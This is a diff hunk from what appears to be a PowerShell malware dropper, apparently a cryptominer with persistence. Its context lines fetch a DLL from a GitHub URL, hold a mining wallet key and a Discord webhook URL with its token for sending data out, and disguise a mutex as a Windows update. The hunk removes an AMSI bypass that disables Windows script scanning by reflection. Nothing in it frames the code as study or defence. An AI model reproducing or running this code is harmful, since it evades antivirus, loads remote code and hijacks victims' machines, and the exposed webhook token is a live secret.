@@ -5,13 +5,6 @@ $DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.d
 $Wallet = "1871092382" # Mining Key
 $Webhook = "https://discord.com/api/webhooks/1496175376966090855/I_Dn3uZ1clrG-J3XR-T0LRnUo6HKP6u8Ww2j7iut7mcKIZHSyWBzOEwZODtGR3zdAQlK"
 
-# --- AMSI BYPASS (must be first, before any "suspicious" code runs) ---
-try {
-    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-    $f = $a.GetField('amsiInitFailed','NonPublic,Static')
-    $f.SetValue($null,$true)
-} catch { }
-
 # --- SINGLE-INSTANCE MUTEX (prevent double-runs from scheduled task + registry) ---
 $MutexName = "Global\WinSysUpdatesMtx_7f3a"
 $script:Mutex = $null
